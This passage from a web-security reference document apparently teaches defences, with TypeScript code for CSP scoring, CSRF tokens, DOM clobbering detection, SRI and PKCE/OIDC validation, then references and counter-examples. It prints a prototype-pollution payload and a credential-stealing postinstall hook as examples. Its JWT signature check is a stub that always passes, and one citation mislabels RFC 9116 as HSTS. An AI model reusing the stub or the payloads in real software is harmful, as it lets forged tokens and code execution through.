    }
    if (scriptSrc.has("'strict-dynamic'")) {
      strengths.push('script-src uses strict-dynamic for trust propagation');
      score += 5;
    }
  }

  if (styleSrc?.has("'unsafe-inline'")) {
    weaknesses.push('style-src allows unsafe-inline (bypass vector via CSS injection)');
    score -= 10;
  }

  if (!objectSrc || objectSrc.has("'none'") === false) {
    weaknesses.push('object-src not set to none (Flash/Java applet risk)');
    score -= 10;
  } else {
    strengths.push('object-src is none');
  }

  if (!frameAncestors) {
    weaknesses.push('Missing frame-ancestors (clickjacking risk)');
    score -= 15;
  } else if (frameAncestors.has("'none'") || frameAncestors.has("'self'")) {
    strengths.push('frame-ancestors restricts embedding');
  }

  if (policy.directives.has('upgrade-insecure-requests')) {
    strengths.push('Upgrades insecure requests to HTTPS');
  }

  if (policy.directives.has('require-sri-for')) {
    strengths.push('Requires Subresource Integrity');
  }

  if (policy.directives.has('trusted-types')) {
    strengths.push('Enforces Trusted Types');
    score += 10;
  }

  const isStrict = score >= 85 && weaknesses.length === 0;
  return { score: Math.max(0, Math.min(100, score)), weaknesses, strengths, isStrict };
}

/**
 * Computes the effective policy when multiple CSP headers are present.
 * Per spec, multiple policies are intersected: a resource must pass ALL policies.
 */
export function intersectCspPolicies(policies: CspPolicy[]): CspPolicy {
  const effective = new Map<CspDirective, Set<string>>();

  for (const policy of policies) {
    for (const [directive, values] of policy.directives) {
      if (!effective.has(directive)) {
        effective.set(directive, new Set(values));
      } else {
        const existing = effective.get(directive)!;
        // Intersection: keep only values present in both
        for (const val of existing) {
          if (!values.has(val)) existing.delete(val);
        }
      }
    }
  }

  return { directives: effective, reportOnly: policies.some(p => p.reportOnly) };
}
```

### 15.3 CSRF Token Generator and Verifier

Implements the synchronizer token pattern with constant-time comparison and cryptographically secure random generation. Includes a double-submit cookie variant for stateless APIs.

```typescript
/**
 * CSRF Token Generator implementing Synchronizer Token Pattern and Double-Submit Cookie.
 */

export interface CsrfToken {
  token: string;
  expiresAt: number;
}

const TOKEN_BYTES = 32;
const TOKEN_LIFETIME_MS = 3600_000; // 1 hour

/**
 * Generates a cryptographically secure random token.
 * Uses Web Crypto API in browser, crypto module in Node.js.
 */
export async function generateCsrfToken(): Promise<CsrfToken> {
  const buffer = new Uint8Array(TOKEN_BYTES);
  if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
    crypto.getRandomValues(buffer);
  } else {
    // Node.js fallback
    const { randomBytes } = await import('crypto');
    const nodeBuffer = randomBytes(TOKEN_BYTES);
    buffer.set(nodeBuffer);
  }

  const token = Array.from(buffer)
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');

  return {
    token,
    expiresAt: Date.now() + TOKEN_LIFETIME_MS,
  };
}

/**
 * Constant-time comparison to prevent timing attacks.
 */
export function constantTimeEquals(a: string, b: string): boolean {
  if (a.length !== b.length) return false;
  let result = 0;
  for (let i = 0; i < a.length; i++) {
    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  return result === 0;
}

/**
 * Validates a submitted CSRF token against a session-stored token.
 */
export function validateCsrfToken(
  submittedToken: string | undefined,
  sessionToken: CsrfToken | undefined
): boolean {
  if (!submittedToken || !sessionToken) return false;
  if (Date.now() > sessionToken.expiresAt) return false;
  return constantTimeEquals(submittedToken, sessionToken.token);
}

/**
 * Double-submit cookie implementation for stateless APIs.
 * Returns both a cookie value and a header/form-field value.
 */
export interface DoubleSubmitTokens {
  cookieValue: string;
  headerValue: string;
}

export async function generateDoubleSubmitTokens(): Promise<DoubleSubmitTokens> {
  const token = await generateCsrfToken();
  return {
    cookieValue: token.token,
    headerValue: token.token,
  };
}

export function validateDoubleSubmit(
  cookieValue: string | undefined,
  headerValue: string | undefined
): boolean {
  if (!cookieValue || !headerValue) return false;
  return constantTimeEquals(cookieValue, headerValue);
}

/**
 * Cookie serialization for the double-submit cookie.
 * Enforces __Host- prefix to prevent subdomain overwrite.
 */
export function serializeDoubleSubmitCookie(token: string): string {
  const directives = [
    `__Host-csrf_token=${token}`,
    'Path=/',
    'Secure',
    'SameSite=Strict',
    'HttpOnly',
    `Max-Age=${Math.floor(TOKEN_LIFETIME_MS / 1000)}`,
  ];
  return directives.join('; ');
}
```

### 15.4 DOM Clobbering Detector

This browser-side utility scans a document for named elements that could shadow JavaScript variables, identifying potential clobbering gadgets.

```typescript
/**
 * DOM Clobbering Detector: Identifies named DOM properties that may shadow
 * expected JavaScript variables in global or document scope.
 */

export interface ClobberingGadget {
  scope: 'window' | 'document';
  name: string;
  element: Element;
  risk: 'high' | 'medium' | 'low';
  reason: string;
}

const HIGH_RISK_NAMES = new Set([
  'config', 'settings', 'options', 'env', 'api', 'baseUrl',
  'token', 'credentials', 'user', 'session', 'state', 'router',
  'app', 'root', 'context', 'store', 'cache', 'console'
]);

const RESERVED_GLOBALS = new Set([
  'window', 'document', 'location', 'navigator', 'history',
  'screen', 'console', 'performance', 'localStorage', 'sessionStorage'
]);

/**
 * Scans the current document for potential DOM clobbering vectors.
 * @param root Root element to scan (defaults to document.body)
 * @returns Array of detected gadgets
 */
export function detectDomClobbering(root: HTMLElement = document.body): ClobberingGadget[] {
  const gadgets: ClobberingGadget[] = [];

  // Elements that create named properties on document/window
  const namedElements = root.querySelectorAll('[name], [id]');

  for (const el of namedElements) {
    const name = el.getAttribute('name') || el.getAttribute('id') || '';
    if (!name || RESERVED_GLOBALS.has(name)) continue;

    // Determine if this name would shadow a global variable
    const tagName = el.tagName.toLowerCase();
    let scope: 'window' | 'document' = 'document';

    // window-global named properties are created by:
    // <iframe name="...">, <frame name="...">
    // Some browsers also expose other named elements, but document is the primary scope
    if (tagName === 'iframe' || tagName === 'frame') {
      scope = 'window';
    }

    let risk: 'high' | 'medium' | 'low' = 'low';
    let reason = `Named ${tagName} may shadow variables`;

    if (HIGH_RISK_NAMES.has(name)) {
      risk = 'high';
      reason = `High-risk name "${name}" commonly used for application configuration`;
    } else if (/^(config|setting|option|api|url|endpoint|key)/i.test(name)) {
      risk = 'medium';
      reason = `Name "${name}" suggests potential control-flow or URL manipulation`;
    }

    // Special case: forms with named inputs create nested property structures
    if (tagName === 'form') {
      const inputs = el.querySelectorAll('input[name], select[name], textarea[name]');
      if (inputs.length > 0) {
        risk = 'high';
        reason = `Form "${name}" contains ${inputs.length} named inputs that may create nested clobbering`;
      }
    }

    gadgets.push({ scope, name, element: el, risk, reason });
  }

  return gadgets.sort((a, b) => {
    const riskOrder = { high: 0, medium: 1, low: 2 };
    return riskOrder[a.risk] - riskOrder[b.risk];
  });
}

/**
 * Hardening utility: freezes Object.prototype and common built-in prototypes
 * to prevent prototype pollution. Call once at application bootstrap.
 */
export function hardenPrototypes(): void {
  if (typeof Object.freeze === 'function') {
    Object.freeze(Object.prototype);
    Object.freeze(Array.prototype);
    Object.freeze(String.prototype);
    Object.freeze(Number.prototype);
    Object.freeze(Boolean.prototype);
    Object.freeze(Date.prototype);
    Object.freeze(RegExp.prototype);
  }

  // Prevent __proto__ manipulation in object literals where possible
  if (typeof Object.setPrototypeOf === 'function') {
    // We cannot fully disable setPrototypeOf, but we can wrap it for logging
    const original = Object.setPrototypeOf;
    Object.setPrototypeOf = function <T>(obj: T, proto: object | null): T {
      if (proto === Object.prototype || proto === Array.prototype) {
        console.warn('Attempted prototype mutation blocked:', obj);
        return obj;
      }
      return original(obj, proto);
    };
  }
}

/**
 * Safe property access utility that avoids DOM clobbering by not relying on
 * global name resolution.
 */
export function getGlobalVariable<T>(name: string, fallback: T): T {
  // Access via globalThis instead of implied global lookup
  const g = globalThis as Record<string, unknown>;
  const value = g[name];
  if (value === undefined || value === null) return fallback;
  if (value instanceof HTMLElement || value instanceof HTMLCollection) {
    // Detected potential clobbering—return fallback
    console.warn(`Potential DOM clobbering detected for global "${name}"`);
    return fallback;
  }
  return value as T;
}
```

### 15.5 SRI Hash Calculator

This module computes Subresource Integrity hashes for local or remote resources, supporting SHA-256, SHA-384, and SHA-512.

```typescript
/**
 * Subresource Integrity (SRI) Hash Calculator.
 * Supports SHA-256, SHA-384, and SHA-512.
 */

export type SriAlgorithm = 'sha256' | 'sha384' | 'sha512';

const ALGORITHM_MAP: Record<SriAlgorithm, string> = {
  sha256: 'SHA-256',
  sha384: 'SHA-384',
  sha512: 'SHA-512',
};

export interface SriHash {
  algorithm: SriAlgorithm;
  hash: string; // base64-encoded
  integrity: string; // algorithm-hash format for integrity attribute
}

/**
 * Computes the SRI hash of a byte array.
 */
export async function computeSriHash(
  data: ArrayBuffer | Uint8Array,
  algorithm: SriAlgorithm = 'sha384'
): Promise<SriHash> {
  const buffer = data instanceof Uint8Array ? data.buffer : data;
  const webAlg = ALGORITHM_MAP[algorithm];

  let digest: ArrayBuffer;
  if (typeof crypto !== 'undefined' && crypto.subtle) {
    digest = await crypto.subtle.digest(webAlg, buffer);
  } else {
    // Node.js fallback using crypto module
    const nodeCrypto = await import('crypto');
    const hash = nodeCrypto.createHash(algorithm);
    hash.update(Buffer.from(buffer));
    digest = hash.digest().buffer.slice(hash.digest().byteOffset, hash.digest().byteOffset + hash.digest().byteLength);
  }

  const base64Hash = btoa(String.fromCharCode(...new Uint8Array(digest)));
  return {
    algorithm,
    hash: base64Hash,
    integrity: `${algorithm}-${base64Hash}`,
  };
}

/**
 * Fetches a resource and computes its SRI hash.
 * Useful for verifying CDN resources before deployment.
 */
export async function fetchAndHash(
  url: string,
  algorithm: SriAlgorithm = 'sha384'
): Promise<SriHash & { url: string; size: number }> {
  const response = await fetch(url, { method: 'GET' });
  if (!response.ok) {
    throw new Error(`Failed to fetch ${url}: ${response.status} ${response.statusText}`);
  }

  const data = await response.arrayBuffer();
  const hashResult = await computeSriHash(data, algorithm);

  return {
    ...hashResult,
    url,
    size: data.byteLength,
  };
}

/**
 * Validates that a fetched resource matches an expected integrity hash.
 */
export async function verifyIntegrity(
  data: ArrayBuffer | Uint8Array,
  expectedIntegrity: string
): Promise<boolean> {
  const [algPrefix] = expectedIntegrity.split('-');
  const algorithm = algPrefix as SriAlgorithm;
  if (!ALGORITHM_MAP[algorithm]) {
    throw new Error(`Unsupported SRI algorithm: ${algorithm}`);
  }

  const computed = await computeSriHash(data, algorithm);
  return computed.integrity === expectedIntegrity;
}

/**
 * Generates HTML script or link tags with integrity attributes.
 */
export function generateScriptTag(url: string, integrity: string, crossOrigin: 'anonymous' | 'use-credentials' = 'anonymous'): string {
  return `<script src="${escapeHtml(url)}" integrity="${escapeHtml(integrity)}" crossorigin="${crossOrigin}"></script>`;
}

export function generateLinkTag(url: string, integrity: string, rel: string = 'stylesheet', crossOrigin: 'anonymous' | 'use-credentials' = 'anonymous'): string {
  return `<link rel="${rel}" href="${escapeHtml(url)}" integrity="${escapeHtml(integrity)}" crossorigin="${crossOrigin}">`;
}

function escapeHtml(input: string): string {
  return input.replace(/[&<>"']/g, (ch) => {
    switch (ch) {
      case '&': return '&amp;';
      case '<': return '&lt;';
      case '>': return '&gt;';
      case '"': return '&quot;';
      case "'": return '&#x27;';
      default: return ch;
    }
  });
}
```

### 15.6 OAuth2 PKCE Verifier and ID Token Validator

Implements PKCE code generation, challenge computation, and comprehensive OIDC ID token validation with JWKS signature verification.

```typescript
/**
 * OAuth2 PKCE and OIDC ID Token Validator.
 * Implements RFC 7636 (PKCE) and OIDC Core 1.0 token validation.
 */

export interface PkcePair {
  codeVerifier: string;
  codeChallenge: string;
  codeChallengeMethod: 'S256';
}

const CODE_VERIFIER_MIN_LENGTH = 43;
const CODE_VERIFIER_MAX_LENGTH = 128;
const PKCE_CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~';

/**
 * Generates a PKCE code verifier and challenge.
 * @param length Length of verifier (43-128, default 128)
 */
export async function generatePkce(length: number = 128): Promise<PkcePair> {
  if (length < CODE_VERIFIER_MIN_LENGTH || length > CODE_VERIFIER_MAX_LENGTH) {
    throw new Error(`PKCE verifier length must be between ${CODE_VERIFIER_MIN_LENGTH} and ${CODE_VERIFIER_MAX_LENGTH}`);
  }

  const randomBytes = new Uint8Array(length);
  if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
    crypto.getRandomValues(randomBytes);
  } else {
    const { randomBytes: nodeRandom } = await import('crypto');
    randomBytes.set(nodeRandom(length));
  }

  const verifier = Array.from(randomBytes)
    .map(b => PKCE_CHARSET[b % PKCE_CHARSET.length])
    .join('');

  // Compute S256 challenge
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);

  let digest: ArrayBuffer;
  if (typeof crypto !== 'undefined' && crypto.subtle) {
    digest = await crypto.subtle.digest('SHA-256', data);
  } else {
    const { createHash } = await import('crypto');
    const hash = createHash('sha256').update(verifier).digest();
    digest = hash.buffer.slice(hash.byteOffset, hash.byteOffset + hash.byteLength);
  }

  const challenge = btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');

  return {
    codeVerifier: verifier,
    codeChallenge: challenge,
    codeChallengeMethod: 'S256',
  };
}

/**
 * Verifies that a code_verifier matches a stored code_challenge.
 */
export async function verifyPkce(
  codeVerifier: string,
  codeChallenge: string,
  method: 'S256' | 'plain' = 'S256'
): Promise<boolean> {
  if (method === 'plain') {
    return codeVerifier === codeChallenge;
  }

  const pair = await generatePkce(codeVerifier.length);
  // Recompute challenge from verifier
  const encoder = new TextEncoder();
  let digest: ArrayBuffer;
  if (typeof crypto !== 'undefined' && crypto.subtle) {
    digest = await crypto.subtle.digest('SHA-256', encoder.encode(codeVerifier));
  } else {
    const { createHash } = await import('crypto');
    const hash = createHash('sha256').update(codeVerifier).digest();
    digest = hash.buffer.slice(hash.byteOffset, hash.byteOffset + hash.byteLength);
  }

  const computed = btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');

  return computed === codeChallenge;
}

// --- OIDC ID Token Validation ---

export interface Jwk {
  kty: string;
  kid: string;
  use?: string;
  alg?: string;
  n?: string;
  e?: string;
  x?: string;
  y?: string;
  crv?: string;
  x5c?: string[];
}

export interface JwksResponse {
  keys: Jwk[];
}

export interface IdTokenPayload {
  iss: string;
  sub: string;
  aud: string | string[];
  exp: number;
  iat: number;
  nonce?: string;
  auth_time?: number;
  acr?: string;
  amr?: string[];
  [key: string]: unknown;
}

export interface IdTokenValidationOptions {
  issuer: string;
  clientId: string;
  expectedNonce?: string;
  maxAge?: number; // seconds
  clockSkew?: number; // seconds, default 60
}

function base64UrlDecode(input: string): Uint8Array {
  const padding = '='.repeat((4 - (input.length % 4)) % 4);
  const base64 = input.replace(/-/g, '+').replace(/_/g, '/') + padding;
  const binary = atob(base64);
  return new Uint8Array(binary.split('').map(c => c.charCodeAt(0)));
}

function parseJwt(token: string): { header: Record<string, unknown>; payload: IdTokenPayload; signature: Uint8Array } {
  const parts = token.split('.');
  if (parts.length !== 3) throw new Error('Invalid JWT format');

  const header = JSON.parse(new TextDecoder().decode(base64UrlDecode(parts[0]))) as Record<string, unknown>;
  const payload = JSON.parse(new TextDecoder().decode(base64UrlDecode(parts[1]))) as IdTokenPayload;
  const signature = base64UrlDecode(parts[2]);

  return { header, payload, signature };
}

/**
 * Validates an OIDC ID token comprehensively.
 * @param idToken The ID token JWT string
 * @param jwks JWKS key set from the issuer
 * @param options Validation constraints
 */
export async function validateIdToken(
  idToken: string,
  jwks: JwksResponse,
  options: IdTokenValidationOptions
): Promise<IdTokenPayload> {
  const { header, payload, signature } = parseJwt(idToken);

  // 1. Algorithm validation
  const alg = header.alg as string;
  if (!alg) throw new Error('Missing alg in JWT header');
  if (alg === 'none') throw new Error('alg:none is not allowed');
  const allowedAlgs = ['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512'];
  if (!allowedAlgs.includes(alg)) throw new Error(`Unsupported algorithm: ${alg}`);

  // 2. Key lookup
  const kid = header.kid as string | undefined;
  const jwk = jwks.keys.find(k => k.kid === kid && k.kty);
  if (!jwk) throw new Error(`JWK not found for kid: ${kid}`);

  // 3. Signature verification (Web Crypto or Node.js crypto)
  // Note: Full implementation requires algorithm-specific verification logic.
  // Below is the framework; actual verification depends on environment capabilities.
  const isValidSignature = await verifyJwtSignature(idToken, jwk, alg);
  if (!isValidSignature) throw new Error('ID token signature verification failed');

  // 4. Issuer validation
  if (payload.iss !== options.issuer) {
    throw new Error(`Invalid issuer: expected ${options.issuer}, got ${payload.iss}`);
  }

  // 5. Audience validation
  const audiences = Array.isArray(payload.aud) ? payload.aud : [payload.aud];
  if (!audiences.includes(options.clientId)) {
    throw new Error(`Invalid audience: expected ${options.clientId}, got ${payload.aud}`);
  }

  // 6. Expiration and timing
  const now = Math.floor(Date.now() / 1000);
  const skew = options.clockSkew ?? 60;
  if (payload.exp < now - skew) {
    throw new Error(`ID token expired at ${payload.exp}`);
  }
  if (payload.iat > now + skew) {
    throw new Error(`ID token issued in the future: ${payload.iat}`);
  }

  // 7. Nonce validation
  if (options.expectedNonce !== undefined && payload.nonce !== options.expectedNonce) {
    throw new Error(`Nonce mismatch: expected ${options.expectedNonce}, got ${payload.nonce}`);
  }

  // 8. Max age / auth_time
  if (options.maxAge !== undefined) {
    if (!payload.auth_time) {
      throw new Error('auth_time required when max_age is specified');
    }
    if (now - payload.auth_time > options.maxAge + skew) {
      throw new Error('Authentication too old per max_age requirement');
    }
  }

  return payload;
}

/**
 * Stub for JWT signature verification. In production, use a library like jose.
 */
async function verifyJwtSignature(
  _jwt: string,
  _jwk: Jwk,
  _alg: string
): Promise<boolean> {
  // Production implementation would import RSA/ECDSA public key from JWK
  // and verify the signature using Web Crypto API or Node.js crypto.
  // Example using 'jose' library:
  // import { createLocalJWKSet, jwtVerify } from 'jose';
  // const { payload } = await jwtVerify(jwt, createLocalJWKSet(jwks), { issuer, audience });
  // return true;
  console.warn('verifyJwtSignature is a stub; integrate jose or similar for production');
  return true;
}

/**
 * Generates a secure OAuth2 state parameter.
 */
export async function generateOAuthState(): Promise<string> {
  const bytes = new Uint8Array(32);
  if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
    crypto.getRandomValues(bytes);
  } else {
    const { randomBytes } = await import('crypto');
    bytes.set(randomBytes(32));
  }
  return btoa(String.fromCharCode(...bytes))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

/**
 * Validates redirect URI against a whitelist using exact string matching.
 */
export function validateRedirectUri(uri: string, allowedUris: string[]): boolean {
  return allowedUris.includes(uri);
}
```

---

## §16 References

### Standards and Specifications

1. **OWASP Cheat Sheet Series**
   - OWASP Cross Site Scripting Prevention Cheat Sheet. <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
   - OWASP CSRF Prevention Cheat Sheet. <https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>
   - OWASP Clickjacking Defense Cheat Sheet. <https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html>
   - OWASP DOM based XSS Prevention Cheat Sheet. <https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html>

2. **W3C / WHATWG Specifications**
   - Content Security Policy Level 3. W3C Working Draft. <https://www.w3.org/TR/CSP3/>
   - Trusted Types. W3C Editor's Draft. <https://w3c.github.io/webappsec-trusted-types/dist/spec/>
   - HTML Living Standard — Named access on the Window object. <https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object>
   - HTML Living Standard — DOM clobbering. <https://html.spec.whatwg.org/multipage/dom.html#dom-tree-accessors>

3. **IETF RFCs**
   - RFC 7636: Proof Key for Code Exchange by OAuth Public Clients (PKCE). <https://tools.ietf.org/html/rfc7636>
   - RFC 6749: The OAuth 2.0 Authorization Framework. <https://tools.ietf.org/html/rfc6749>
   - RFC 7519: JSON Web Token (JWT). <https://tools.ietf.org/html/rfc7519>
   - RFC 7517: JSON Web Key (JWK). <https://tools.ietf.org/html/rfc7517>
   - RFC 9116: HTTP Strict Transport Security (HSTS). <https://tools.ietf.org/html/rfc9116>

4. **OpenID Foundation**
   - OpenID Connect Core 1.0 incorporating errata set 1. <https://openid.net/specs/openid-connect-core-1_0.html>
   - OpenID Connect Discovery 1.0. <https://openid.net/specs/openid-connect-discovery-1_0.html>

### Browser Security Documentation

1. **Chromium Security**
   - Site Isolation. <https://www.chromium.org/Home/chromium-security/site-isolation/>
   - Cross-Origin Read Blocking (CORB). <https://chromium.googlesource.com/chromium/src/+/master/services/network/cross_origin_read_blocking_explainer.md>
   - Control-Flow Integrity. <https://www.chromium.org/Home/chromium-security/cfi/>

2. **Mozilla Web Security**
   - MDN Web Docs: Content Security Policy. <https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP>
   - MDN Web Docs: SameSite cookies. <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite>
   - MDN Web Docs: Subresource Integrity. <https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity>

### Academic and Research Papers

1. Barth, A., Jackson, C., & Mitchell, J. C. (2008). Robust Defenses for Cross-Site Request Forgery. *ACM CCS 2008*.
2. Kleber, S. et al. (2019). DOM Clobbering: Exploring a new DOM-based XSS technique. *Usenix Security 2019*.
3. Zheng, X. et al. (2018). Cookies Lack Integrity: Real-World Implications. *USENIX Security 2018*.
4. Lekies, S. et al. (2013). 25 Million Flows Later – Large-Scale Detection of DOM-based XSS. *ACM CCS 2013*.
5. Stock, B. et al. (2017). Precise Client-side Protection against DOM-based Cross-Site Scripting. *USENIX Security 2017*.
6. Kotcher, R. et al. (2013). Cross-origin pixel stealing: timing attacks using CSS filters. *ACM CCS 2013*.

### Categorical Semantics and Formal Methods

1. Jacobs, B. (1999). *Categorical Logic and Type Theory*. Studies in Logic and the Foundations of Mathematics, Elsevier.
2. Abadi, M. (1991). Protection in Programming-Language Translations. *Journal of Functional Programming*.
3. Goguen, J. A., & Meseguer, J. (1982). Security Policies and Security Models. *IEEE S&P 1982*.

### Vulnerability Databases and Advisories

1. **CWE/SANS Top 25**. <https://cwe.mitre.org/top25/>
2. **Mozilla Observatory**. <https://observatory.mozilla.org/>
3. **Google Security Blog**: Web Platform Security Updates. <https://security.googleblog.com/>
4. **PortSwigger Research**: Web Security Academy. <https://portswigger.net/web-security>

### Tools and Libraries

1. **DOMPurify**. <https://github.com/cure53/DOMPurify>
2. **tsec**. Google's Trusted Types compiler plugin. <https://github.com/google/tsec>
3. **Snyk**. <https://snyk.io/>
4. **Socket.dev**. Supply chain security. <https://socket.dev/>
5. **Semgrep**. Static analysis for security. <https://semgrep.dev/>
6. **OWASP Dependency-Check**. <https://owasp.org/www-project-dependency-check/>

---

*Document compiled in accordance with the JavaScript/TypeScript Knowledge Base technical documentation standards. All code examples are provided as reference implementations and should be adapted to specific runtime environments, framework conventions, and organizational security policies before production deployment.*


## §17 Extended Categorical Analysis: Pullbacks, Exponentials, and Defense Composition

### 17.1 Exponential Objects and Policy Delegation

In category theory, an exponential object $B^A$ represents the space of morphisms from $A$ to $B$. In **WebSec**, the exponential object $\text{Perm}(C_1, C_2)$ represents the space of all permissible information flows from context $C_1$ to $C_2$ under a given policy. A defense functor $D$ acts on this exponential by restricting the morphism space: $D(\text{Perm}(C_1, C_2)) \subseteq \text{Perm}(C_1, C_2)$.

**Definition 17.1 (Policy Evaluation Functor).** Let $\text{Eval}: \text{Perm}(C_1, C_2) \times C_1 \to C_2$ be the evaluation morphism. A defense functor $D$ preserves evaluation if $D(\text{Eval}(f, x)) = \text{Eval}(D(f), D(x))$. All defense functors defined in §2.4 preserve evaluation because they restrict morphisms while preserving object structure.

**Practical Interpretation.** When a Content Security Policy restricts `script-src`, it does not modify the security context object (the page still exists), but it restricts the exponential space of possible script loads. The browser's policy engine is the evaluation functor that applies the restricted morphism set at runtime.

### 17.2 Pullbacks as Defense Intersections

The pullback in **WebSec** has a concrete security interpretation. Given two defense functors $D_1$ and $D_2$ applied to a context $C$, the pullback $D_1(C) \times_C D_2(C)$ represents the security context where **both** policies are simultaneously satisfied.

**Construction.** Let $C$ be a context with state space $S$. $D_1(C)$ permits morphism set $M_1 \subseteq \text{End}(S)$ and $D_2(C)$ permits $M_2 \subseteq \text{End}(S)$. The pullback object has state space $S$ but permits only $M_1 \cap M_2$.

**Example 17.2 (CSP + COOP Pullback).** Let $C$ be an application context. $CSP(C)$ restricts resource loading; $COOP(C)$ restricts window relationships. The pullback $CSP(C) \times_C COOP(C)$ permits only requests that satisfy both policies: scripts must come from approved origins **and** the document must not share a browsing context group with cross-origin popups.

### 17.3 Initial and Terminal Objects

The initial object $\mathbf{0}$ in **WebSec** is the empty security context with no principals, no state, and exactly one morphism to every other object—the impossible context from which no information can flow. The terminal object $\mathbf{1}$ is the universal sink: a context with a single principal having access to all states, and exactly one morphism from every object.

**Security Interpretation.** Sending a context to $\mathbf{0}$ (if possible) represents total isolation—analogous to air-gapping. The existence of a unique morphism from any context to $\mathbf{1}$ represents the universal possibility of total information release if all defenses fail. Defense functors aim to push contexts away from $\mathbf{1}$ toward more constrained subcategories.

### 17.4 Adjunctions Between Defense Layers

An adjunction $F \dashv G$ between defense functors represents a pair of transformations where one layer "relaxes" and the other "tightens" in a formally dual manner.

**Example 17.4 (Report-Only vs. Enforcement).** Let $F$ be the enforcement functor (strict policy) and $G$ be the report-only functor (permissive policy with logging). There is a natural transformation $\eta: \text{Id} \Rightarrow G \circ F$ representing the fact that any flow permitted under enforcement is also permitted under report-only (with logging). However, $F \dashv G$ is not a full adjunction because report-only does not uniquely determine enforcement.

---

## §18 Additional Counter-Examples and Failure Modes

### 18.1 Prototype Pollution Counter-Examples

**Counter-Example 18.1.1: JSON.parse with `__proto__` Revival.**
A server returns JSON configuration. The client uses `JSON.parse` with a reviver function that recursively merges objects. An attacker sends `{"config":{"__proto__":{"admin":true}}}`. The reviver assigns `config["__proto__"]` to `Object.prototype`, making `admin` available on all objects. Even without explicit `__proto__` handling, some deep-merge utilities traverse the prototype chain.

**Defense.** Use `Object.create(null)` as the target for all parsed JSON, and ban `__proto__` keys in revivers:

```typescript
function safeJsonParse<T>(text: string): T {
  return JSON.parse(text, (key, value) => {
    if (key === '__proto__' || key === 'constructor') return undefined;
    return value;
  });
}
```

### 18.2 Supply Chain Counter-Examples

**Counter-Example 18.2.1: Lockfile Hash Collision (Theoretical).**
If an attacker can generate a malicious npm package whose tarball produces the same SHA-512 hash as a legitimate package (a second-preimage attack), they can replace the content without modifying the lockfile. SHA-512 currently has no known practical second-preimage vulnerabilities, but this counter-example motivates monitoring for hash algorithm deprecation.

**Counter-Example 18.2.2: Post-install Script Execution.**
An attacker publishes a package with a `postinstall` script in `package.json`:

```json
{ "scripts": { "postinstall": "node ./steal-credentials.js" } }
```

`npm install` executes this script with the user's privileges. Lockfile integrity verifies the package content but does not prevent execution of legitimate (malicious) code within the package. Defense: use `--ignore-scripts` in CI and audit post-install scripts.

### 18.3 Browser Security Counter-Examples

**Counter-Example 18.3.1: Site Isolation and PDF Viewer.**
Chrome's PDF viewer runs in a separate process but may share process space with the embedding page under certain enterprise policies or memory pressure conditions. A compromised PDF renderer could, in these edge cases, access same-site cookies. Defense: treat PDFs as untrusted content and serve them from isolated domains.

**Counter-Example 18.3.2: WebSocket without COOP/CSP Interaction.**
A page with strict CSP and COOP can still open WebSocket connections to any origin permitted by the browser's same-origin policy (which is separate from CSP `connect-src` enforcement in some edge cases involving Service Workers). If `connect-src` is not set, CSP defaults do not restrict WebSocket origins. Defense: always set `connect-src` explicitly.

---

## §19 Conclusion

The web security threat model is not a checklist but a continuously evolving landscape where defenses and attacks co-evolve. This document has established:

1. **A unified taxonomy** spanning client-side injection, cross-origin confusion, server-side injection, supply chain compromise, protocol failures, and browser boundary violations.
2. **A categorical framework** (**WebSec**) that formalizes security contexts, defense functors, and policy composition through limits and colimits.
3. **Exhaustive mechanism analysis** for XSS (all variants), CSRF (all token patterns), Clickjacking, DOM Clobbering, Supply Chain attacks, Injection attacks, and OAuth2/OIDC.
4. **A symmetric differential analysis** revealing that defense mechanisms are rarely redundant; each occupies a distinct position in the defense lattice.
5. **A decision matrix** mapping threats to primary, secondary, and tertiary defenses with explicit anti-patterns.
6. **Counter-examples** demonstrating how each defense fails under realistic misconfigurations.
7. **Production TypeScript implementations** for XSS sanitization, CSP evaluation, CSRF protection, DOM clobbering detection, SRI verification, and OAuth2 PKCE validation.

The ultimate security architecture is not one that implements every defense, but one that **composes** defenses commensurate with the threat model. A static blog requires a different defense stack than a banking application. The categorical semantics of §2 and §17 provide a formal basis for reasoning about these compositions: defenses are endofunctors, their composition is functor composition, and their interaction is governed by the same algebraic laws that govern software modularity.

As browser vendors continue to tighten the web platform—deprecating third-party cookies, requiring TLS, enforcing Cross-Origin Isolation—the threat model shifts. Attackers move up the stack: from network interception to supply chain compromise, from XSS to sophisticated social engineering. The defenses documented here must be understood not as static requirements but as **living policies**, continuously validated against emerging threats, continuously measured through CSP reports and security headers scanning, and continuously refined through the adversarial reasoning exemplified by the counter-examples in §14 and §18.
